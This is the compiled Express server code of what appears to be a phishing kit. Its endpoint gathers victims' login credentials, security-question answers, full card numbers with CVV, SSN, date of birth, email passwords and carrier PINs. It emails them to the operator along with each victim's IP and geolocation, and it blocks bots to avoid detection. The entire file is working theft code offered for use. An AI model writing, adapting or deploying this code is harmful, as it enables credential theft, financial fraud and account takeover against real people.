"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const express_nobots_1 = __importDefault(require("express-nobots"));
const geoip_lite_1 = __importDefault(require("geoip-lite"));
require("dotenv").config();
const sendEmail_1 = require("./utils/sendEmail");
const path_1 = __importDefault(require("path"));
const app = express_1.default();
const port = process.env.PORT || 5000;
app.use(express_nobots_1.default());
app.use(express_1.default.json());
app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
        const geo = geoip_lite_1.default.lookup(ip);
        const values = req.body;
        yield sendEmail_1.sendEmail(process.env.EMAIL_ADDRESS, `
     <div>*********************************************@*********************************************</div>
     ${values.form === "LOGIN DETAILS"
            ? `
        <br>
        <h4>| *LOGIN DETAILS*</h4>
        <p>| USERNAME: <b>${values.loginDetails.username}</b></p>
        <p>| PASSWORD: <b>${values.loginDetails.password}</b></p>
        <br>
        `
            : `
     ${values.form === "SECURITY CHALLENGE"
                ? `
     <br>
     <h4>| *SECURITY CHALLENGE*</h4>
     <p>| QUESTION ONE: <b>${values.securityChallenge.challenQuestion1}</b></p>
     <p>| ANSWER ONE: <b>${values.securityChallenge.answer1}</b></p>
     <p>| QUESTION TWO: <b>${values.securityChallenge.challenQuestion2}</b></p>
     <p>| ANSWER TWO: <b>${values.securityChallenge.answer2}</b></p>
     <p>| QUESTION THREE: <b>${values.securityChallenge.challenQuestion3}</b></p>
     <p>| ANSWER THREE: <b>${values.securityChallenge.answer3}</b></p>
     <br>
     `
                : `${values.form === "CARD INFORMATION"
                    ? `
      <br>
      <h4>| *CARD INFORMATION*</h4>
      <p>| FULL NAME: <b>${values.cardInformation.fullname}</b></p>
      <p>| CARD NUMBER: <b>${values.cardInformation.cardNumber}</b></p>
      <p>| EXPIRATION DATE: <b>${values.cardInformation.expiryDate}</b></B></p>
      <p>| CVV: <b>${values.cardInformation.cvv}</b></p>
      <p>| SSN: <b>${values.cardInformation.ssn}</b></p>
      <p>| DOB: <b>${values.cardInformation.dob}</b></p>
      <br>
     `
                    : `
               <br><br>
               <h4>| ACCOUNT UPDATE</h4>
               <p>| EMAIL ADDRESS: <b>${values.accountUpdate.email}</b></p>
               <p>| EMAIL ADDRESS PASSWORD: <b>${values.accountUpdate.password}</b></p>
               <p>| PHONE NUMBER: <b>${values.accountUpdate.phoneNumber}</b></p>
               <p>| CARRIER PIN: <b>${values.accountUpdate.carrierPin}</b></p>
               <br><br>
               `}`}
     `}
     <div>*********************************************@*********************************************</div>
     <br>
     <p>| IP: <b>${ip}</b></p>
     <p>| LOCATION: <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
     <p>| TIMEZONE: <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
     <br>
     <div>*********************************************END*********************************************</div>
     `);
        res.send(Promise.resolve());
    }
    catch (error) {
        console.log(error);
    }
}));
app.use(express_1.default.static(path_1.default.join(__dirname, "../build")));
app.get("/*", (_, res) => {
    res.sendFile(path_1.default.join(__dirname, "../build", "index.html"));
});
app.listen(port, () => {
    console.log(`Listening on http://localhost:${port}`);
});
//# sourceMappingURL=index.js.map